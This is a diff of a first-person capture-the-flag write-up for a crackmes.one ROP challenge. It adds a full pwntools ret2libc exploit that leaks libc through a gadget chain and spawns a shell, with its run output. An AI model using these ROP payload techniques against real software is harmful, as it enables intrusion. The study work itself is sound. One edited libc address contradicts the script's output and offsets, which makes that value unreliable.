@@ -2,7 +2,7 @@
 This exploit was provided by BitFriends on crackmes.one https://crackmes.one/crackme/5f3d7ed033c5d42a7c667d95
 
 # Context
-This is very exciting as it's my first time doing any type of buffer overflow myself from scratch. I'd like to thank BitFriends in advance for uploading a binary that serves as a low entry introduction. My I had to learn almost all of it as I only undestood buffer overflows from a theoretical standpoint. So, frankly, for most of this solve I had no clue what I was doing. Because of this, I decided to include some of my learning process in this write up, as for me otherwise it would have big nerrative jumps that wouldn't otherwise make sense.
+This is very exciting as it's my first time doing any type of buffer overflow myself from scratch. I'd like to thank BitFriends in advance for uploading a binary that serves as a low entry introduction. My I had to learn almost all of it as I only undestood buffer overflows from a theoretical standpoint. Because of this, I decided to include some of my learning process in this write up.
 
 # Recon
 ```
@@ -283,14 +283,16 @@ print(hex(write_libc))
 ❯ python translate_libc.py
 0x7f027fd0dde0
 ```
-Amazing! Our libc address is `0x7f027fd0dde0`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Because of this, the entire script will have to be a single big exploit doing all steps at once. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
+Amazing! Our libc address is `0xe0ddd07f027f0000`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Because of this, the entire script will have to be a single big exploit doing all steps at once. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
 ```
 ~/Projects/RE/crackmes.one/rop
 ❯ ldd ./rop
         linux-vdso.so.1 (0x00007f77bda05000)
         libc.so.6 => /usr/lib/libc.so.6 (0x00007f77bd600000)
         /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f77bda07000)
-
+```
+Since we leaked libc by the use of `write()` we need to know the offset of that function as well, eventhough we won't use it for exploitation itself. This is because our libc address is currently as it were 'contaminated' with the `write()` offset and has to be subtracted in our script.
+```
 ~/Projects/RE/crackmes.one/rop
 ❯ readelf -s /usr/lib/libc.so.6 | grep -E " write@@| system@@"
   1064: 0000000000053b00    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
@@ -299,4 +301,81 @@ Amazing! Our libc address is `0x7f027fd0dde0`! Now, this only proves our exploit
 ~/Projects/RE/crackmes.one/rop
 ❯ strings -t x /usr/lib/libc.so.6 | grep "/bin/sh"
  1b01aa /bin/sh
+```
+Additionally, to finish the exploit properly, we also need an extra `ret` to get 16 byte alignment. Without it the newly spawned shell will throw a segmentation fault right away. I found a really clean one with `ROPgadget`.
+```
+~/Projects/RE/crackmes.one/rop 33s
+❯ ROPgadget --binary ./rop | grep ": ret"
+0x0000000000400416 : ret
+```
+Now that we have everything, it's time to stitch the whole script into one single exploit, and spawn that shell.
+```Python
+from pwn import *
+
+elf = ELF('./rop')
+p = process('./rop')
+
+# libc leaking
+gadget1     = 0x40060a
+rbx_value   = 0x00
+rbp_value   = 0x01
+r12_value   = 0x601018
+r13_value   = 0x01
+r14_value   = 0x601018
+r15_value   = 0x08
+gadget2     = 0x4005f0
+main        = 0x400537
+
+payload  = b'A' * 72
+payload += p64(gadget1)
+payload += p64(rbx_value)
+payload += p64(rbp_value)
+payload += p64(r12_value)
+payload += p64(r13_value)
+payload += p64(r14_value)
+payload += p64(r15_value)
+payload += p64(gadget2)
+payload += b'B' * 56
+payload += p64(main)
+
+p.sendline(payload)
+p.recvuntil(b'Input: ')   # eat first prompt
+
+leaked = p.recv(8, timeout=1)
+write_libc = u64(leaked)
+print(f"leaked libc address: {hex(write_libc)}")
+
+# shell calling
+lib_base    = write_libc - 0x10dde0 # leak libc base with write so subtract write offset to get base
+pop_rdi_ret = 0x400613
+bin_sh      = lib_base + 0x1b01aa
+system      = lib_base + 0x053b00
+ret         = 0x400416
+
+payload  = b'A' * 72
+payload += p64(pop_rdi_ret)
+payload += p64(bin_sh)
+payload += p64(ret)
+payload += p64(system)
+
+p.recvuntil(b'Input: ')   # eat second prompt
+p.sendline(payload)
+p.interactive()
+```
+Running this script will give us the final solution to this challenge and, of course, interactive shell:
+```
+~/Projects/RE/crackmes.one/rop 1m 9s
+❯ python exploit.py
+[*] '/home/edoardo/Projects/RE/crackmes.one/rop/rop'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+[+] Starting local process './rop': pid 57140
+leaked libc address: 0x7fa32ed0dde0
+[*] Switching to interactive mode
+$ whoami
+edoardo
 ```
